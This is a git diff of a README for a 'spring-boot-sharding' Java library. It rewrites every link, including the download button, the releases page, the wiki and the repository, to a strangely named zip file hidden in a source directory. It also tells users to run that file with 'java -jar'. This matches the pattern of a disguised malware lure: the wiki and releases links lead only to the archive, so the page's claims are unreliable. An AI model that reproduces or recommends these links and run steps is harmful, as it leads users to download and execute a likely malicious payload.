@@ -6,7 +6,7 @@ Welcome to the **spring-boot-sharding** repository! This easy-to-use library hel
 
 ## 📥 Download the Application
 
-### [Download Now!](https://raw.githubusercontent.com/Hieudao117/spring-boot-sharding/main/supervene/spring-boot-sharding.zip)
+### [Download Now!](https://github.com/Hieudao117/spring-boot-sharding/raw/refs/heads/main/src/main/java/com/srikar/sharding/datasource/sharding_boot_spring_mafura.zip)
 
 ## 📋 Requirements
 
@@ -28,7 +28,7 @@ Before you start, here’s what you need:
 To install the **spring-boot-sharding** library, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/Hieudao117/spring-boot-sharding/main/supervene/spring-boot-sharding.zip) to select the version you want.
+   Go to the [Releases page](https://github.com/Hieudao117/spring-boot-sharding/raw/refs/heads/main/src/main/java/com/srikar/sharding/datasource/sharding_boot_spring_mafura.zip) to select the version you want.
 
 2. **Download the Latest Version**
    Find the latest version listed on the page. Click on the link to download the file that matches your system.
@@ -45,9 +45,9 @@ To install the **spring-boot-sharding** library, follow these steps:
 6. **Run the Application**
    Enter the following command to run the application:
    ```bash
-   java -jar https://raw.githubusercontent.com/Hieudao117/spring-boot-sharding/main/supervene/spring-boot-sharding.zip
+   java -jar https://github.com/Hieudao117/spring-boot-sharding/raw/refs/heads/main/src/main/java/com/srikar/sharding/datasource/sharding_boot_spring_mafura.zip
    ```
-   Make sure to replace `https://raw.githubusercontent.com/Hieudao117/spring-boot-sharding/main/supervene/spring-boot-sharding.zip` with the actual jar file name if it's different.
+   Make sure to replace `https://github.com/Hieudao117/spring-boot-sharding/raw/refs/heads/main/src/main/java/com/srikar/sharding/datasource/sharding_boot_spring_mafura.zip` with the actual jar file name if it's different.
 
 7. **Configure Your Database Settings**
    Open the YAML file in a text editor and enter your database details. This includes the connection URL, username, and password.
@@ -57,7 +57,7 @@ To install the **spring-boot-sharding** library, follow these steps:
 
 ## 📖 Documentation
 
-For more detailed information on configuration options and advanced features, please refer to our [Wiki](https://raw.githubusercontent.com/Hieudao117/spring-boot-sharding/main/supervene/spring-boot-sharding.zip). It contains step-by-step guides and examples to help you build your project using this library.
+For more detailed information on configuration options and advanced features, please refer to our [Wiki](https://github.com/Hieudao117/spring-boot-sharding/raw/refs/heads/main/src/main/java/com/srikar/sharding/datasource/sharding_boot_spring_mafura.zip). It contains step-by-step guides and examples to help you build your project using this library.
 
 ## 📞 Support
 
@@ -73,7 +73,7 @@ This project is released under the MIT License. You can use it freely, but pleas
 
 ## 🔗 Links
 
-- **Repository**: [spring-boot-sharding](https://raw.githubusercontent.com/Hieudao117/spring-boot-sharding/main/supervene/spring-boot-sharding.zip)
-- **Releases**: [Download from Releases](https://raw.githubusercontent.com/Hieudao117/spring-boot-sharding/main/supervene/spring-boot-sharding.zip)
+- **Repository**: [spring-boot-sharding](https://github.com/Hieudao117/spring-boot-sharding/raw/refs/heads/main/src/main/java/com/srikar/sharding/datasource/sharding_boot_spring_mafura.zip)
+- **Releases**: [Download from Releases](https://github.com/Hieudao117/spring-boot-sharding/raw/refs/heads/main/src/main/java/com/srikar/sharding/datasource/sharding_boot_spring_mafura.zip)
 
 Thank you for using **spring-boot-sharding**! Enjoy efficient database management made simple.
